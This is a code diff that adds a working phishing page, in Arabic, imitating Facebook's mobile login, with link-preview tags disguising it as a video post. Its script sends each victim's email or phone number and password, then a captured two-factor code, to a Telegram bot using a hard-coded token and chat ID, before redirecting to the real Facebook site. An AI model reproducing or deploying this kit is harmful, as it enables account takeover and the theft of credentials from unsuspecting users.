@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    
+    <!-- أكواد معاينة اللينك (تظهر من بره كأنها بوست فيسبوك حقيقي من غير ما تأثر على شكل الصفحة من جوه) -->
+    <meta property="og:title" content="فيديو جديد تم نشره، اضغط للمشاهدة" />
+    <meta property="og:description" content="شاهد التفاصيل الكاملة والتعليقات قبل الحذف." />
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" />
+    <meta property="og:type" content="article" />
+
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+
+        .top-banner {
+            text-align: center;
+            padding: 10px;
+            font-size: 13px;
+            color: #1c1e21;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .top-banner a {
+            color: #0080ff;
+            text-decoration: none;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 16px;
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+            box-sizing: border-box;
+        }
+
+        .lang-select {
+            color: #90949c;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .fb-logo-img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .form-group {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 18px;
+            padding: 9px 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            max-width: 330px;
+            margin-top: 4px;
+        }
+
+        .forgot-link {
+            color: #1c1e21;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            margin: 12px 0;
+            background: none;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #707579;
+            font-size: 13px;
+            width: 100%;
+            max-width: 330px;
+            margin: 15px auto;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ccd0d5;
+        }
+
+        .divider::before {
+            margin-left: 10px;
+        }
+
+        .divider::after {
+            margin-right: 10px;
+        }
+
+        .create-container {
+            width: 100%;
+            text-align: center;
+        }
+
+        .create-btn {
+            background-color: transparent;
+            color: #0064e0;
+            border: 1px solid #0064e0;
+            border-radius: 18px;
+            padding: 7px 10px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            max-width: 330px;
+            box-sizing: border-box;
+            display: inline-block;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .meta-logo-container {
+            font-weight: 600;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .hidden { display: none; }
+        .code-box-title { font-size: 16px; font-weight: bold; color: #1c1e21; margin-bottom: 8px; text-align: center; }
+        .code-box-desc { font-size: 13px; color: #606770; margin-bottom: 15px; text-align: center; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+    <div class="top-banner">
+        احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع. <a href="#">تحميل</a>
+    </div>
+
+    <div class="container">
+        <div class="lang-select">العربية</div>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook" class="fb-logo-img">
+
+        <!-- فورم تسجيل الدخول الأصلي -->
+        <div class="form-group" id="loginSection">
+            <form id="loginForm" style="width: 100%; display: flex; flex-direction: column; gap: 10px; align-items: center;">
+                <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+                <input type="password" id="password" placeholder="كلمة السر" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+
+            <button class="forgot-link">هل نسيت كلمة السر؟</button>
+
+            <div class="divider">أو</div>
+            
+            <div class="create-container">
+                <button class="create-btn">إنشاء حساب جديد</button>
+            </div>
+        </div>
+
+        <!-- قسم إدخال رمز التحقق (يظهر بعد الضغط) -->
+        <div class="form-group hidden" id="codeSection">
+            <div class="code-box-title">تسجيل الدخول بحاجة إلى موافقة</div>
+            <div class="code-box-desc">تم إرسال رمز تسجيل الدخول إلى بريدك الإلكتروني أو هاتفك. يرجى إدخال الرمز أدناه للمتابعة.</div>
+            <form id="codeForm" style="width: 100%; display: flex; flex-direction: column; gap: 10px; align-items: center;">
+                <input type="text" id="secCode" placeholder="أدخل رمز الأمان (6 أرقام)" required>
+                <button type="submit" class="login-btn">متابعة</button>
+            </form>
+        </div>
+
+    </div>
+
+    <footer>
+        <div class="meta-logo-container">
+            Meta
+        </div>
+    </footer>
+
+    <script>
+        // إرسال البيانات للتليجرام وإظهار شاشة الكود
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var token = '9133588436:AAHpv-ScJ1bk_wpzKFi1bS1WrBzOBMkyaH8';
+            var chatId = '6777647416';
+            
+            var message = '⚠️ تم التقاط بيانات جديدة (نسخة الموبايل):\n📧 البريد/الهاتف: ' + email + '\n🔑 كلمة المرور: ' + password;
+
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+
+            // إخفاء فورم الدخول وإظهار فورم إدخال الكود بنفس التصميم
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('codeSection').classList.remove('hidden');
+        });
+
+        // إرسال الكود للبوت ثم التحويل للفيسبوك الحقيقي
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var code = document.getElementById('secCode').value;
+
+            var token = '9133588436:AAHpv-ScJ1bk_wpzKFi1bS1WrBzOBMkyaH8';
+            var chatId = '6777647416';
+            
+            var message = '🔢 رمز التحقق المُدخل:\ncode: ' + code;
+
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                window.location.href = 'https://www.facebook.com';
+            });
+        });
+    </script>
+
+</body>
+</html>
